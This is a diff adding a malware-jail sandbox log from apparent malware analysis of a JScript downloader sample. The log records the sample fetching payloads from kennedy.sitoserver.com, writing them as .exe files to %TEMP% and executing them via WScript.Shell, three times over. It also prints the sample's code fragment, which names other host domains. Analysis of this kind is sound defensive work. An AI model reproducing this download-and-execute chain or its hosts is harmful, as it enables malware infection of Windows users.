@@ -1,0 +1,112 @@
+10 Sep 01:01:16 - mailware-jail, a malware sandbox ver. 0.15
+10 Sep 01:01:16 - ------------------------
+10 Sep 01:01:16 - Arguments: /home/maik/gitHub/TFM/fame/storage/c410086a1075dc1210aa7e2ff8f3040d860ca7c98e8805ff5e29b4c1617cbce4/c410086a1075dc1210aa7e2ff8f3040d860ca7c98e8805ff5e29b4c1617cbce4.js
+10 Sep 01:01:16 - Sandbox environment sequence: fame/modules/community/processing/malware_jail/malware-jail/env/utils.js,fame/modules/community/processing/malware_jail/malware-jail/env/eval.js,fame/modules/community/processing/malware_jail/malware-jail/env/function.js,fame/modules/community/processing/malware_jail/malware-jail/env/wscript.js,fame/modules/community/processing/malware_jail/malware-jail/env/browser.js,fame/modules/community/processing/malware_jail/malware-jail/env/agents.js,fame/modules/community/processing/malware_jail/malware-jail/env/other.js,fame/modules/community/processing/malware_jail/malware-jail/env/console.js
+10 Sep 01:01:16 - Malware files: /home/maik/gitHub/TFM/fame/storage/c410086a1075dc1210aa7e2ff8f3040d860ca7c98e8805ff5e29b4c1617cbce4/c410086a1075dc1210aa7e2ff8f3040d860ca7c98e8805ff5e29b4c1617cbce4.js
+10 Sep 01:01:16 - Execution timeout set to: 60 seconds
+10 Sep 01:01:16 - Output file for sandbox dump: fame/modules/community/processing/malware_jail/malware-jail/sandbox_dump_after.json
+10 Sep 01:01:16 - Output directory for generated files: fame/modules/community/processing/malware_jail/malware-jail/output/
+10 Sep 01:01:16 - Download from remote server: No
+10 Sep 01:01:17 - ==> Preparing Sandbox environment.
+10 Sep 01:01:17 -  => Executing: fame/modules/community/processing/malware_jail/malware-jail/env/utils.js quitely
+10 Sep 01:01:17 -  => Executing: fame/modules/community/processing/malware_jail/malware-jail/env/eval.js quitely
+10 Sep 01:01:17 -  => Executing: fame/modules/community/processing/malware_jail/malware-jail/env/function.js quitely
+10 Sep 01:01:17 -  => Executing: fame/modules/community/processing/malware_jail/malware-jail/env/wscript.js quitely
+10 Sep 01:01:17 -  => Executing: fame/modules/community/processing/malware_jail/malware-jail/env/browser.js quitely
+10 Sep 01:01:17 -  => Executing: fame/modules/community/processing/malware_jail/malware-jail/env/agents.js quitely
+10 Sep 01:01:17 -  => Executing: fame/modules/community/processing/malware_jail/malware-jail/env/other.js quitely
+10 Sep 01:01:17 -  => Executing: fame/modules/community/processing/malware_jail/malware-jail/env/console.js quitely
+10 Sep 01:01:17 - ==> Executing malware file(s). =========================================
+10 Sep 01:01:17 -  => Executing: /home/maik/gitHub/TFM/fame/storage/c410086a1075dc1210aa7e2ff8f3040d860ca7c98e8805ff5e29b4c1617cbce4/c410086a1075dc1210aa7e2ff8f3040d860ca7c98e8805ff5e29b4c1617cbce4.js verbosely, reporting silent catches
+10 Sep 01:01:17 - Saving: fame/modules/community/processing/malware_jail/malware-jail/output/_home_maik_gitHub_TFM_fame_storage_c410086a1075dc1210aa7e2ff8f3040d860ca7c98e8805ff5e29b4c1617cbce4_c410086a1075dc1210aa7e2ff8f3040d860ca7c98e8805ff5e29b4c1617cbce4.js
+10 Sep 01:01:17 - Saving: fame/modules/community/processing/malware_jail/malware-jail/output/tr__home_maik_gitHub_TFM_fame_storage_c410086a1075dc1210aa7e2ff8f3040d860ca7c98e8805ff5e29b4c1617cbce4_c410086a1075dc1210aa7e2ff8f3040d860ca7c98e8805ff5e29b4c1617cbce4.js
+10 Sep 01:01:17 - WScript.scriptfullname = (string) '/home/maik/gitHub/TFM/fame/storage/c410086a1075dc1210aa7e2ff8f3040d860ca7c98e8805ff5e29b4c1617cbce4/c410086a1075dc1210aa7e2ff8f3040d860ca7c98e8805ff5e29b4c1617cbce4.js'
+10 Sep 01:01:17 - WScript.arguments = (object) '/home/maik/gitHub/TFM/fame/storage/c410086a1075dc1210aa7e2ff8f3040d860ca7c98e8805ff5e29b4c1617cbce4/c410086a1075dc1210aa7e2ff8f3040d860ca7c98e8805ff5e29b4c1617cbce4.js,xyz'
+10 Sep 01:01:17 - Calling eval[1]('var b = "kennedy.sitoserver.com nzvincent.com abama.org".split(" "); var ws = WScript.CreateObject("WScript.Shell"); var fn = ws.ExpandEnvironmentStrings("%TEMP%")+String.fromCharCode(92)+"799755"; var xo = WScript.CreateObject("MSXML2.XMLHTTP"); var ... (truncated)')
+10 Sep 01:01:17 - WScript.CreateObject(WScript.Shell)
+10 Sep 01:01:17 - new WScript.Shell[14]
+10 Sep 01:01:17 - WScript.Shell[14].ExpandEnvironmentStrings(%TEMP%) => C:\Users\User\AppData\Local\Temp
+10 Sep 01:01:17 - WScript.CreateObject(MSXML2.XMLHTTP)
+10 Sep 01:01:17 - new MSXML2.XMLHTTP[15]
+10 Sep 01:01:17 - MSXML2.XMLHTTP[15].onreadystatechange = (undefined) 'undefined'
+10 Sep 01:01:17 - WScript.CreateObject(ADODB.Stream)
+10 Sep 01:01:17 - new ADODB_Stream[16]
+10 Sep 01:01:17 - MSXML2.XMLHTTP[15].open(GET,http://kennedy.sitoserver.com/counter/?id=5552505E160B0601161017241605070F17140507014A070B095E3C5E060A1E4A070B094A091D5E17555E555050525C50505555505E55&rnd=3090341,false)
+10 Sep 01:01:17 - MSXML2.XMLHTTP[15].method = (string) 'GET'
+10 Sep 01:01:17 - MSXML2.XMLHTTP[15].url = (string) 'http://kennedy.sitoserver.com/counter/?id=5552505E160B0601161017241605070F17140507014A070B095E3C5E060A1E4A070B094A091D5E17555E555050525C50505555505E55&rnd=3090341'
+10 Sep 01:01:17 - MSXML2.XMLHTTP[15].async = (boolean) 'false'
+10 Sep 01:01:17 - MSXML2.XMLHTTP[15].send(undefined)
+10 Sep 01:01:17 - MSXML2.XMLHTTP[15] Not sending data, if you want to interact with remote server, set --down
+10 Sep 01:01:17 - MSXML2.XMLHTTP[15].responsebody = (string) 'MZDumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --dow ... (truncated)'
+10 Sep 01:01:17 - MSXML2.XMLHTTP[15].status = (number) '200'
+10 Sep 01:01:17 - MSXML2.XMLHTTP[15].readystate = (number) '4'
+10 Sep 01:01:17 - MSXML2.XMLHTTP[15].onreadystatechange.get() => (undefined) 'undefined'
+10 Sep 01:01:17 - MSXML2.XMLHTTP[15].send(undefined) finished
+10 Sep 01:01:17 - MSXML2.XMLHTTP[15].status.get() => (number) '200'
+10 Sep 01:01:17 - ADODB_Stream[16].Open()
+10 Sep 01:01:17 - ADODB_Stream[16].type = (number) '1'
+10 Sep 01:01:17 - MSXML2.XMLHTTP[15].responsebody.get() => (string) 'MZDumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --dow ... (truncated)'
+10 Sep 01:01:17 - ADODB_Stream[16].content = (string) 'MZDumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --dow ... (truncated)'
+10 Sep 01:01:17 - ADODB_Stream[16].Write(str) - 11202 bytes
+10 Sep 01:01:17 - ADODB_Stream[16].size = (number) '11202'
+10 Sep 01:01:17 - ADODB_Stream[16].size.get() => (number) '11202'
+10 Sep 01:01:17 - ADODB_Stream[16].position = (number) '0'
+10 Sep 01:01:17 - ADODB_Stream[16].SaveToFile(C:\Users\User\AppData\Local\Temp\7997551.exe, 2)
+10 Sep 01:01:17 - ADODB_Stream[16].content.get() => (string) 'MZDumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --dow ... (truncated)'
+10 Sep 01:01:17 - WScript.Shell[14].Run(C:\Users\User\AppData\Local\Temp\7997551.exe, 1, 0)
+10 Sep 01:01:17 - ADODB_Stream[16].Close()
+10 Sep 01:01:17 - MSXML2.XMLHTTP[15].open(GET,http://kennedy.sitoserver.com/counter/?id=5552505E160B0601161017241605070F17140507014A070B095E3C5E060A1E4A070B094A091D5E17555E555050525C50505555505E55&rnd=3090342,false)
+10 Sep 01:01:17 - MSXML2.XMLHTTP[15].method = (string) 'GET'
+10 Sep 01:01:17 - MSXML2.XMLHTTP[15].url = (string) 'http://kennedy.sitoserver.com/counter/?id=5552505E160B0601161017241605070F17140507014A070B095E3C5E060A1E4A070B094A091D5E17555E555050525C50505555505E55&rnd=3090342'
+10 Sep 01:01:17 - MSXML2.XMLHTTP[15].async = (boolean) 'false'
+10 Sep 01:01:17 - MSXML2.XMLHTTP[15].send(undefined)
+10 Sep 01:01:17 - MSXML2.XMLHTTP[15] Not sending data, if you want to interact with remote server, set --down
+10 Sep 01:01:17 - MSXML2.XMLHTTP[15].responsebody = (string) 'MZDumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --dow ... (truncated)'
+10 Sep 01:01:17 - MSXML2.XMLHTTP[15].status = (number) '200'
+10 Sep 01:01:17 - MSXML2.XMLHTTP[15].readystate = (number) '4'
+10 Sep 01:01:17 - MSXML2.XMLHTTP[15].onreadystatechange.get() => (undefined) 'undefined'
+10 Sep 01:01:17 - MSXML2.XMLHTTP[15].send(undefined) finished
+10 Sep 01:01:17 - MSXML2.XMLHTTP[15].status.get() => (number) '200'
+10 Sep 01:01:17 - ADODB_Stream[16].Open()
+10 Sep 01:01:17 - ADODB_Stream[16].type = (number) '1'
+10 Sep 01:01:17 - MSXML2.XMLHTTP[15].responsebody.get() => (string) 'MZDumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --dow ... (truncated)'
+10 Sep 01:01:17 - ADODB_Stream[16].content = (string) 'MZDumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --dow ... (truncated)'
+10 Sep 01:01:17 - ADODB_Stream[16].Write(str) - 11202 bytes
+10 Sep 01:01:17 - ADODB_Stream[16].size = (number) '11202'
+10 Sep 01:01:17 - ADODB_Stream[16].size.get() => (number) '11202'
+10 Sep 01:01:17 - ADODB_Stream[16].position = (number) '0'
+10 Sep 01:01:17 - ADODB_Stream[16].SaveToFile(C:\Users\User\AppData\Local\Temp\7997552.exe, 2)
+10 Sep 01:01:17 - ADODB_Stream[16].content.get() => (string) 'MZDumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --dow ... (truncated)'
+10 Sep 01:01:17 - WScript.Shell[14].Run(C:\Users\User\AppData\Local\Temp\7997552.exe, 1, 0)
+10 Sep 01:01:17 - ADODB_Stream[16].Close()
+10 Sep 01:01:17 - MSXML2.XMLHTTP[15].open(GET,http://kennedy.sitoserver.com/counter/?id=5552505E160B0601161017241605070F17140507014A070B095E3C5E060A1E4A070B094A091D5E17555E555050525C50505555505E55&rnd=3090343,false)
+10 Sep 01:01:17 - MSXML2.XMLHTTP[15].method = (string) 'GET'
+10 Sep 01:01:17 - MSXML2.XMLHTTP[15].url = (string) 'http://kennedy.sitoserver.com/counter/?id=5552505E160B0601161017241605070F17140507014A070B095E3C5E060A1E4A070B094A091D5E17555E555050525C50505555505E55&rnd=3090343'
+10 Sep 01:01:17 - MSXML2.XMLHTTP[15].async = (boolean) 'false'
+10 Sep 01:01:17 - MSXML2.XMLHTTP[15].send(undefined)
+10 Sep 01:01:17 - MSXML2.XMLHTTP[15] Not sending data, if you want to interact with remote server, set --down
+10 Sep 01:01:17 - MSXML2.XMLHTTP[15].responsebody = (string) 'MZDumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --dow ... (truncated)'
+10 Sep 01:01:17 - MSXML2.XMLHTTP[15].status = (number) '200'
+10 Sep 01:01:17 - MSXML2.XMLHTTP[15].readystate = (number) '4'
+10 Sep 01:01:17 - MSXML2.XMLHTTP[15].onreadystatechange.get() => (undefined) 'undefined'
+10 Sep 01:01:17 - MSXML2.XMLHTTP[15].send(undefined) finished
+10 Sep 01:01:17 - MSXML2.XMLHTTP[15].status.get() => (number) '200'
+10 Sep 01:01:17 - ADODB_Stream[16].Open()
+10 Sep 01:01:17 - ADODB_Stream[16].type = (number) '1'
+10 Sep 01:01:17 - MSXML2.XMLHTTP[15].responsebody.get() => (string) 'MZDumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --dow ... (truncated)'
+10 Sep 01:01:17 - ADODB_Stream[16].content = (string) 'MZDumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --dow ... (truncated)'
+10 Sep 01:01:17 - ADODB_Stream[16].Write(str) - 11202 bytes
+10 Sep 01:01:17 - ADODB_Stream[16].size = (number) '11202'
+10 Sep 01:01:17 - ADODB_Stream[16].size.get() => (number) '11202'
+10 Sep 01:01:17 - ADODB_Stream[16].position = (number) '0'
+10 Sep 01:01:17 - ADODB_Stream[16].SaveToFile(C:\Users\User\AppData\Local\Temp\7997553.exe, 2)
+10 Sep 01:01:17 - ADODB_Stream[16].content.get() => (string) 'MZDumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --dow ... (truncated)'
+10 Sep 01:01:17 - WScript.Shell[14].Run(C:\Users\User\AppData\Local\Temp\7997553.exe, 1, 0)
+10 Sep 01:01:17 - ADODB_Stream[16].Close()
+10 Sep 01:01:17 - ==> Cleaning up sandbox.
+10 Sep 01:01:17 - ==> Script execution finished, dumping sandbox environment to a file.
+10 Sep 01:01:17 - The sandbox context has been  saved to: fame/modules/community/processing/malware_jail/malware-jail/sandbox_dump_after.json
+10 Sep 01:01:17 - Saving: fame/modules/community/processing/malware_jail/malware-jail/output/eval1.js
+10 Sep 01:01:17 - Saving: fame/modules/community/processing/malware_jail/malware-jail/output/C__Users_User_AppData_Local_Temp_7997551.exe
+10 Sep 01:01:17 - Saving: fame/modules/community/processing/malware_jail/malware-jail/output/C__Users_User_AppData_Local_Temp_7997552.exe
+10 Sep 01:01:17 - Saving: fame/modules/community/processing/malware_jail/malware-jail/output/C__Users_User_AppData_Local_Temp_7997553.exe
